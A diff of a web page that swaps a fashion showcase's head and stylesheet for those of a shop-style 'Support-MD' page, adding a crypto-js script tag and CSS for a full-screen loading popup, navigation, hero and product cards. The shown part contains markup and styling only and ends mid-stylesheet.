@@ -1,405 +1,704 @@
-<!doctype html>
-<html lang="en" data-theme="dark">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#080b16">
-  <meta name="description" content="Explore a fashion and lifestyle product showcase, discover fashion and lifestyle concepts, and learn what makes each product useful.">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="NOVA STYLE — Discover What's Next">
-  <meta property="og:description" content="A fashion and lifestyle product showcase concept for modern design and emerging technology.">
-  <meta name="robots" content="index,follow">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%2366f4ff'/%3E%3Cstop offset='1' stop-color='%237887ff'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='64' height='64' rx='18' fill='%23080b16'/%3E%3Cpath d='M17 45V19h6l18 17V19h6v26h-6L23 28v17z' fill='url(%23g)'/%3E%3C/svg%3E">
-  <title>NOVA STYLE — Discover What's Next</title>
-  <script>
-    // Apply the saved theme before styles paint to avoid a flash of the wrong theme.
-    (function(){try{var saved=localStorage.getItem("nova-style-theme");document.documentElement.dataset.theme=saved==="light"?"light":"dark";}catch(_){document.documentElement.dataset.theme="dark";}})();
-  </script>
-  <style>
-    :root{color-scheme:dark;--bg:#080b16;--panel:#101629;--panel2:#151d34;--ink:#f5f7ff;--muted:#a5aec7;--line:rgba(176,195,255,.16);--cyan:#66f4ff;--blue:#7887ff;--violet:#b57cff;--lime:#c4ff70;--radius:24px;--max:1200px}
-    [data-theme="light"]{color-scheme:light;--bg:#f7f8fc;--panel:#ffffff;--panel2:#edf0f8;--ink:#171b2b;--muted:#5d667d;--line:rgba(40,54,90,.16);--cyan:#087f91;--blue:#5667df;--violet:#8a4ec5;--lime:#4c7b10}
-    [data-theme="light"] body{background:radial-gradient(ellipse at 80% -10%,rgba(74,91,255,.09),transparent 38%),var(--bg)}
-    [data-theme="light"] .announcement{color:#505a73;background:rgba(247,248,252,.92)}
-    [data-theme="light"] .site-header{background:rgba(247,248,252,.88)}
-    [data-theme="light"] .nav-links{color:#424b64}
-    [data-theme="light"] .gradient-text{background:linear-gradient(105deg,#202641 8%,#087f91 42%,#5667df 74%,#8a4ec5);-webkit-background-clip:text;background-clip:text;color:transparent}
-    [data-theme="light"] .micro-trust{color:#626d86}
-    [data-theme="light"] .ticker{background:rgba(30,45,80,.025)}
-    [data-theme="light"] .ticker-inner{color:#626d86}
-    [data-theme="light"] .product-card{background:linear-gradient(160deg,#fff,#f0f3fa)}
-    [data-theme="light"] .product-image-wrap{background:#e9edf6}
-    [data-theme="light"] .product-tag{background:#ffffffed;color:#202641;border-color:#26345230}
-    [data-theme="light"] .manifesto-points div{color:#343d56}
-    [data-theme="light"] .benefit{background:rgba(40,54,90,.025)}
-    [data-theme="light"] .field label{color:#343d56}
-    [data-theme="light"] .field input,[data-theme="light"] .field textarea,[data-theme="light"] .field select{background:#fff;color:var(--ink)}
-    [data-theme="light"] footer{background:#eef1f8}
-    [data-theme="light"] .footer-links{color:#515b74}
-    [data-theme="light"] .footer-bottom{color:#626d86}
-    [data-theme="light"] .content-page .updated-note{color:#626d86}
-    [data-theme="light"] .modal{background:#fff}
-    [data-theme="light"] .close-modal{background:#eef1f8;color:#202641}
-    [data-theme="light"] .notice{color:#075b67;background:#e8fbfd;border-color:#087f9144}
-    [data-theme="light"] .nav-links.open{background:#f7f8fc}
-    /* Light theme contrast fixes: override colors that were designed for dark surfaces. */
-    [data-theme="light"] .announcement{color:#3f4963;background:rgba(247,248,252,.96)}
-    [data-theme="light"] .site-header{background:rgba(247,248,252,.94)}
-    [data-theme="light"] .filter-btn,[data-theme="light"] .sort-select{color:#242b40;background:#fff;border-color:rgba(40,54,90,.2)}
-    [data-theme="light"] .filter-btn.active{color:#fff;background:#087f91;border-color:#087f91}
-    [data-theme="light"] .float-card{background:rgba(255,255,255,.96);color:#171b2b;border-color:rgba(40,54,90,.18);box-shadow:0 15px 45px rgba(30,40,70,.14)}
-    [data-theme="light"] .contact-note{color:#5d667d}
-    [data-theme="light"] .footer-links{color:#3f4963}
-    [data-theme="light"] .footer-bottom{color:#505a73}
-    [data-theme="light"] .nav-links{color:#343d56}
-    [data-theme="light"] .nav-links.open{background:#fff;box-shadow:0 18px 28px rgba(30,40,70,.08)}
-    [data-theme="light"] .field input::placeholder,[data-theme="light"] .field textarea::placeholder{color:#6b7489;opacity:1}
-    [data-theme="light"] .theme-toggle{background:#fff;color:#171b2b;border-color:rgba(40,54,90,.2)}
-    [data-theme="dark"] .theme-toggle{background:#151d34;color:#f5f7ff}
-    .theme-toggle{display:inline-flex;align-items:center;justify-content:center;gap:8px;min-height:42px;padding:0 13px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--ink);font-weight:750;font-size:.82rem;white-space:nowrap;transition:background .2s,border-color .2s,transform .2s}
-    .theme-toggle:hover{transform:translateY(-1px);border-color:var(--cyan)}
-    .theme-toggle-icon{font-size:1.05rem;line-height:1}
-    @media(max-width:640px){.theme-toggle{margin-left:auto;padding:0 11px;font-size:.76rem}.menu-btn{margin-left:0}}
-    *{box-sizing:border-box}
-    html{scroll-behavior:smooth;scroll-padding-top:90px}
-    body{margin:0;background:radial-gradient(ellipse at 80% -10%,rgba(74,91,255,.19),transparent 38%),var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;line-height:1.55}
-    a{color:inherit;text-decoration:none}button,input,textarea,select{font:inherit}button,a{-webkit-tap-highlight-color:transparent}button{cursor:pointer}img{display:block;max-width:100%}
-    :focus-visible{outline:3px solid var(--cyan);outline-offset:4px}
-    .skip{position:absolute;left:-9999px;top:8px;background:var(--cyan);color:#07101a;padding:10px 14px;border-radius:10px;z-index:99}.skip:focus{left:8px}
-    .announcement{border-bottom:1px solid var(--line);text-align:center;padding:9px 16px;color:#cbd5f5;font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;background:rgba(8,11,22,.85)}
-    .site-header{position:sticky;top:0;z-index:20;background:rgba(8,11,22,.82);backdrop-filter:blur(18px);border-bottom:1px solid var(--line)}
-    .nav-wrap{max-width:var(--max);margin:auto;padding:15px 24px;display:flex;align-items:center;gap:26px}
-    .brand{display:inline-flex;align-items:center;gap:10px;font-weight:900;letter-spacing:-.07em;font-size:1.2rem;white-space:nowrap}
-    .brand-mark{width:34px;height:34px;border-radius:11px;background:linear-gradient(135deg,var(--cyan),var(--blue) 58%,var(--violet));display:grid;place-items:center;color:#080b16;font-weight:950;font-size:1rem;box-shadow:0 0 26px #667aff44}
-    .nav-links{display:flex;align-items:center;gap:25px;margin-left:auto;font-size:.88rem;color:#c4cbe0}.nav-links a:hover,.footer-links a:hover{color:var(--cyan)}
-    .nav-cta,.button{display:inline-flex;align-items:center;justify-content:center;gap:9px;border:1px solid transparent;border-radius:999px;padding:12px 18px;font-weight:800;background:linear-gradient(110deg,var(--cyan),#a7b5ff);color:#07101a;transition:transform .2s,filter .2s}
-    .nav-cta:hover,.button:hover{transform:translateY(-2px);filter:brightness(1.08)}
-    .button-secondary{background:rgba(255,255,255,.03);color:var(--ink);border-color:var(--line)}
-    .menu-btn{display:none;border:1px solid var(--line);background:var(--panel);color:var(--ink);border-radius:12px;width:42px;height:42px}
-    .container{max-width:var(--max);margin:0 auto;padding:0 24px}
-    .hero{padding:68px 24px 48px;max-width:var(--max);margin:auto}
-    .hero-grid{display:grid;grid-template-columns:1.02fr .98fr;gap:40px;align-items:center;min-height:550px}
-    .eyebrow{display:inline-flex;align-items:center;gap:9px;color:var(--cyan);font-size:.73rem;letter-spacing:.16em;text-transform:uppercase;font-weight:850}
-    .eyebrow:before{content:"";width:7px;height:7px;border-radius:50%;background:var(--cyan);box-shadow:0 0 15px var(--cyan)}
-    h1{font-size:clamp(3.2rem,7.5vw,6.8rem);line-height:.91;letter-spacing:-.085em;margin:24px 0;max-width:680px}
-    .gradient-text{background:linear-gradient(105deg,#fff 8%,var(--cyan) 42%,#a6aaff 74%,var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
-    .hero-copy p{color:var(--muted);font-size:1.08rem;max-width:530px;margin:0 0 28px}
-    .hero-actions{display:flex;gap:12px;flex-wrap:wrap}
-    .micro-trust{display:flex;gap:20px;flex-wrap:wrap;margin-top:30px;color:#8994b3;font-size:.76rem}.micro-trust span:before{content:"✦";color:var(--cyan);margin-right:7px}
-    .hero-visual{min-height:480px;position:relative;display:grid;place-items:center;isolation:isolate}
-    .orbit{position:absolute;width:min(95%,480px);aspect-ratio:1;border:1px solid rgba(102,244,255,.24);border-radius:50%;box-shadow:0 0 65px #5b79ff18,inset 0 0 55px #4a5cff13;animation:rotate 32s linear infinite}
-    .orbit:before,.orbit:after{content:"";position:absolute;border:1px solid rgba(181,124,255,.3);border-radius:50%;inset:10% -6%;transform:rotate(54deg)}
-    .orbit:after{inset:18% -1%;transform:rotate(-46deg);border-color:rgba(102,244,255,.2)}
-    .hero-image{width:76%;height:420px;object-fit:cover;border-radius:44% 44% 28px 28px;position:relative;z-index:1;border:1px solid #c8d8ff33;box-shadow:0 30px 90px #0008;mask-image:linear-gradient(to bottom,#000 70%,transparent 100%)}
-    .float-card{position:absolute;z-index:2;background:rgba(15,22,42,.87);border:1px solid var(--line);backdrop-filter:blur(15px);padding:13px 16px;border-radius:16px;box-shadow:0 15px 45px #0005;font-size:.78rem}
-    .float-card strong{display:block;font-size:.9rem}.float-card small{color:var(--muted)}.float-one{top:13%;right:0}.float-two{bottom:13%;left:0}.signal{display:inline-block;width:7px;height:7px;background:var(--lime);border-radius:50%;margin-right:7px;box-shadow:0 0 12px var(--lime)}
-    .ticker{border-block:1px solid var(--line);background:rgba(255,255,255,.02);overflow:hidden}
-    .ticker-inner{max-width:var(--max);margin:auto;padding:16px 24px;display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;color:#8f9bbd;font-size:.7rem;letter-spacing:.14em;text-transform:uppercase}
-    .section{padding:88px 0}.section-head{display:flex;justify-content:space-between;align-items:end;gap:24px;margin-bottom:30px}.section-head h2{font-size:clamp(2.1rem,4.5vw,4rem);letter-spacing:-.075em;line-height:1;margin:12px 0 0}.section-head p{max-width:400px;color:var(--muted);margin:0}
-    .product-tools{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:24px}
-    .search-wrap{flex:1;min-width:220px;display:flex;align-items:center;gap:10px;padding:0 15px;height:46px;border:1px solid var(--line);border-radius:999px;background:var(--panel)}
-    .search-wrap input{width:100%;min-width:0;background:transparent;border:0;outline:none;color:var(--ink)}
-    .filter-btn,.sort-select{border:1px solid var(--line);border-radius:999px;padding:11px 15px;background:var(--panel);color:#cbd3ea;font-size:.82rem;font-weight:750}
-    .filter-btn.active{background:var(--cyan);border-color:var(--cyan);color:#061018}
-    .sort-select{max-width:100%}
-    .product-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:18px}
-    .product-card{border:1px solid var(--line);border-radius:22px;overflow:hidden;background:linear-gradient(160deg,#141b30,#0d1221);min-width:0;transition:transform .25s,border-color .25s}
-    .product-card:hover{transform:translateY(-5px);border-color:#8d9cff66}
-    .product-image-wrap{position:relative;aspect-ratio:1.25;background:#111a2d;overflow:hidden}
-    .product-image{width:100%;height:100%;object-fit:cover;transition:transform .45s;opacity:.92}
-    .product-card:hover .product-image{transform:scale(1.045)}
-    .product-tag{position:absolute;top:13px;left:13px;border:1px solid #dce6ff38;background:#080b16c9;color:#eaf3ff;padding:6px 10px;border-radius:999px;font-size:.65rem;letter-spacing:.08em;text-transform:uppercase}
-    .product-body{padding:19px}.product-category{color:var(--cyan);font-size:.7rem;letter-spacing:.12em;text-transform:uppercase;font-weight:800}
-    .product-title-row{display:flex;justify-content:space-between;gap:12px;align-items:start;margin-top:7px}.product-title-row h3{margin:0;font-size:1.1rem;letter-spacing:-.04em}.product-price{white-space:nowrap;font-size:.9rem;font-weight:850}
-    .product-body p{color:var(--muted);font-size:.85rem;margin:10px 0 17px}.product-actions{display:flex;gap:9px;flex-wrap:wrap}.product-actions button{font-size:.78rem;padding:10px 13px}
-    .empty-state{grid-column:1/-1;text-align:center;padding:48px 18px;border:1px dashed var(--line);border-radius:20px;color:var(--muted)}
-    .manifesto{display:grid;grid-template-columns:.9fr 1.1fr;border:1px solid var(--line);border-radius:28px;overflow:hidden;background:var(--panel)}
-    .manifesto-art{min-height:360px;position:relative;display:grid;place-items:center;background:radial-gradient(circle at 50% 40%,#5b66d7 0,transparent 38%),linear-gradient(135deg,#182541,#0b1020)}
-    .cube{width:150px;height:150px;border:1px solid #a8faffaa;transform:rotate(30deg) skew(-8deg);box-shadow:0 0 65px #66f4ff2e,inset 0 0 35px #66f4ff19;position:relative}
-    .cube:before,.cube:after{content:"";position:absolute;inset:18px;border:1px solid #b57cff99;transform:translate(20px,-20px)}.cube:after{transform:translate(-20px,20px);border-color:#66f4ff66}
-    .manifesto-copy{padding:clamp(28px,5vw,62px);align-self:center}.manifesto-copy h2{font-size:clamp(2.3rem,4.7vw,4.5rem);letter-spacing:-.075em;line-height:.98;margin:18px 0}.manifesto-copy p{color:var(--muted);max-width:530px}.manifesto-points{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:26px}.manifesto-points div{border-top:1px solid var(--line);padding-top:12px;font-size:.82rem;color:#d5ddf4}.manifesto-points small{display:block;color:var(--muted);margin-top:3px}
-    .benefit-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}.benefit{padding:25px;border:1px solid var(--line);border-radius:20px;background:rgba(255,255,255,.025)}.benefit-icon{width:43px;height:43px;display:grid;place-items:center;border-radius:13px;background:#6a7cff1b;color:var(--cyan);font-size:1.25rem}.benefit h3{font-size:1rem;margin:17px 0 7px}.benefit p{color:var(--muted);font-size:.86rem;margin:0}
-    .faq-list{display:grid;gap:10px;max-width:850px;margin:0 auto}.faq-list details{border:1px solid var(--line);border-radius:15px;background:var(--panel);padding:17px 20px}.faq-list summary{font-weight:800;cursor:pointer}.faq-list details p{color:var(--muted);margin-bottom:0;font-size:.9rem}
-    .contact-panel{display:grid;grid-template-columns:.8fr 1.2fr;gap:40px;padding:clamp(25px,5vw,54px);border:1px solid var(--line);border-radius:28px;background:radial-gradient(ellipse at 10% 0%,#5366ff20,transparent 50%),var(--panel)}
-    .contact-copy h2{font-size:clamp(2.3rem,4vw,3.8rem);letter-spacing:-.075em;line-height:.98;margin:16px 0}.contact-copy p{color:var(--muted)}.contact-note{font-size:.76rem;color:#7e8aa9;margin-top:20px}
-    .contact-form{display:grid;grid-template-columns:1fr 1fr;gap:14px}.field{display:grid;gap:7px}.field.full{grid-column:1/-1}.field label{font-size:.8rem;font-weight:750;color:#dce3f7}.field input,.field textarea,.field select{width:100%;border:1px solid var(--line);border-radius:12px;background:#080d1b;color:var(--ink);padding:13px 14px}.field textarea{min-height:120px;resize:vertical}.form-status{grid-column:1/-1;min-height:1.3em;color:var(--cyan);font-size:.85rem}
-    footer{border-top:1px solid var(--line);background:#060811}.footer-main{max-width:var(--max);margin:auto;padding:45px 24px 30px;display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:35px}.footer-intro p{color:var(--muted);max-width:330px;font-size:.87rem}.footer-col h3{font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;margin:5px 0 14px}.footer-links{display:grid;gap:10px;color:#9ca8c6;font-size:.85rem}.footer-bottom{max-width:var(--max);margin:auto;padding:17px 24px 25px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:15px;color:#7783a3;font-size:.76rem}
 
-    .content-page{display:none;padding:54px 0;border-top:1px solid var(--line);scroll-margin-top:90px}
-    .content-page-inner{max-width:900px;margin:auto;background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:clamp(24px,5vw,54px)}
-    .content-page h2{font-size:clamp(2.2rem,5vw,4rem);line-height:1;letter-spacing:-.075em;margin:12px 0 20px}
-    .content-page h3{font-size:1.1rem;letter-spacing:-.03em;margin:26px 0 8px}
-    .content-page p,.content-page li{color:var(--muted);max-width:75ch}
-    .content-page ul{padding-left:22px}
-    .content-page .updated-note{font-size:.8rem;color:#8994b3;border-top:1px solid var(--line);padding-top:15px;margin-top:28px}
-    .content-page .contact-form{margin-top:22px}
-    .standalone-contact-form{max-width:700px}
-    body.page-mode main,body.page-mode .announcement{display:none}
-    body.page-mode .content-page.page-active{display:block;min-height:calc(100vh - 250px)}
-    body.page-mode .site-header{position:relative}
-    body.page-mode footer{display:block}
-    .modal-backdrop{position:fixed;inset:0;z-index:40;background:#02040bd9;display:none;place-items:center;padding:18px}.modal-backdrop.open{display:grid}.modal{width:min(620px,100%);max-height:90dvh;overflow:auto;background:#101629;border:1px solid var(--line);border-radius:24px;padding:24px;box-shadow:0 30px 100px #000b}.modal-head{display:flex;justify-content:space-between;align-items:start;gap:15px}.modal-head h2{margin:0;font-size:1.6rem;letter-spacing:-.05em}.close-modal{border:1px solid var(--line);border-radius:50%;background:#1b2440;color:var(--ink);width:40px;height:40px}.modal img{width:100%;height:220px;object-fit:cover;border-radius:15px;margin:18px 0}.modal p{color:var(--muted)}.notice{border:1px solid #66f4ff44;background:#66f4ff0c;color:#b9faff;padding:12px 14px;border-radius:12px;font-size:.8rem}
-    @keyframes rotate{to{transform:rotate(360deg)}}
-    @media(max-width:900px){.nav-links{gap:15px}.nav-cta{display:none}.hero-grid{gap:18px}.hero-visual{min-height:400px}.hero-image{height:350px}.product-grid{grid-template-columns:repeat(2,minmax(0,1fr))}.manifesto{grid-template-columns:1fr 1fr}.contact-panel{grid-template-columns:1fr}.footer-main{grid-template-columns:1.2fr 1fr 1fr}}
-    @media(max-width:640px){.announcement{font-size:.62rem}.nav-wrap{padding:12px 16px;gap:12px}.brand{font-size:1.05rem}.menu-btn{display:block;margin-left:auto}.nav-links{display:none;position:absolute;top:100%;left:0;right:0;background:#0b1020;border-bottom:1px solid var(--line);padding:18px 22px 22px;flex-direction:column;align-items:stretch;gap:16px}.nav-links.open{display:flex}.container{padding:0 16px}.hero{padding:42px 16px 30px}.hero-grid{grid-template-columns:1fr;gap:0}.hero-copy p{font-size:.98rem}.hero-visual{min-height:340px;margin-top:15px}.hero-image{height:300px;width:72%}.orbit{width:82%}.float-one{right:0;top:7%}.float-two{bottom:7%;left:0}.ticker-inner{justify-content:center;font-size:.62rem;gap:12px 20px}.section{padding:60px 0}.section-head{align-items:flex-start;flex-direction:column;gap:12px}.section-head h2{font-size:2.6rem}.product-grid{gap:12px}.product-body{padding:13px}.product-title-row{display:block}.product-price{display:block;margin-top:5px}.product-title-row h3{font-size:.98rem}.product-body p{font-size:.8rem}.product-actions button{width:100%}.filter-btn{padding:9px 12px;font-size:.75rem}.search-wrap{flex-basis:100%}.manifesto{grid-template-columns:1fr}.manifesto-art{min-height:250px}.manifesto-copy{padding:29px 23px}.manifesto-points{gap:10px}.benefit-grid{grid-template-columns:1fr}.contact-panel{padding:24px 18px;gap:20px}.contact-form{grid-template-columns:1fr}.field.full{grid-column:auto}.footer-main{grid-template-columns:1fr 1fr;padding:35px 18px 25px;gap:25px 18px}.footer-intro{grid-column:1/-1}.footer-bottom{padding:16px 18px 22px;flex-direction:column}}
-    @media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation:none!important;transition:none!important}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
